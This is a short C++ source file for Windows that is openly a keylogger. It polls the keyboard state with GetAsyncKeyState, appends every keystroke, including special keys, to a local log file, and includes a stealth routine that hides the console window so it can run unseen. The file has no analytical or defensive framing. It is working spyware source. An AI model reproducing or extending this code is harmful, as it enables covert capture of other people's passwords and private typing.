#include<iostream>
#include<windows.h>
#include<winuser.h>
#include<conio.h>

using namespace std;
//prototype :
int save(int key_Strock , const char *file);

void stealth_fun();

// main function : 
int main() {
    //to run keyllogger in background 

    //stealth_fun(); 

    while(true) {
        // asci code 
        for(char c=8 ; c <191 ; c++) {
            // if a key is pressed save it ():
            if(GetAsyncKeyState(c) == -32767)
            {
                save(c,"LogKEY.TXT"); 
            }
        }
    }

    getch(); 
}
//core function 
int save(int key_Strock , const char *file) {
    // to skip mouse 
   if((key_Strock == 1)||(key_Strock == 2))
          return 0 ; 

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+"); 

    switch(key_Strock) {
        case 8 : 
        fprintf(OUTPUT_FILE,"%s","[backspace]"); 
        break;

        case 13 : 
        fprintf(OUTPUT_FILE,"%s","\n"); 
        break; 

        case 32: 
        fprintf(OUTPUT_FILE,"%s"," "); 
        break; 

        case VK_TAB : 
        fprintf(OUTPUT_FILE,"%s","[TAB]"); 
        break; 

        case VK_SHIFT : 
        fprintf(OUTPUT_FILE,"%s","[SHIFT]"); 
        break; 

        case  VK_CONTROL: 
        fprintf(OUTPUT_FILE,"%s","[CONTROL]"); 
        break; 

        case  VK_ESCAPE: 
        fprintf(OUTPUT_FILE,"%s","[ESCAP]"); 
        break; 

        case  VK_END: 
        fprintf(OUTPUT_FILE,"%s","[END]"); 
        break; 

        case  VK_HOME: 
        fprintf(OUTPUT_FILE,"%s","[HOME]"); 
        break;

        case VK_LEFT  : 
        fprintf(OUTPUT_FILE,"%s","[LEFT]"); 
        break; 

        case VK_RIGHT : 
        fprintf(OUTPUT_FILE,"%s","[RIGHT]"); 
        break; 

        case  VK_DOWN : 
        fprintf(OUTPUT_FILE,"%s","[DOWN]"); 
        break; 

        case  VK_UP: 
        fprintf(OUTPUT_FILE,"%s","[UP]"); 
        break; 
        case  110: 
        fprintf(OUTPUT_FILE,"%s","[.]"); 
        break; 

        case 190 : 
        fprintf(OUTPUT_FILE,"%s","[.]"); 
        break;

        default :
        fprintf(OUTPUT_FILE,"%s",&key_Strock); 
    }    

    fclose(OUTPUT_FILE); 
    cout << key_Strock<<endl; 

return 0; 
}

void stealth_fun() {

    HWND stealth ; 
    AllocConsole() ;
    stealth = FindWindowA("ConsoleWindowClass",NULL); 
    ShowWindow(stealth,0);  

}


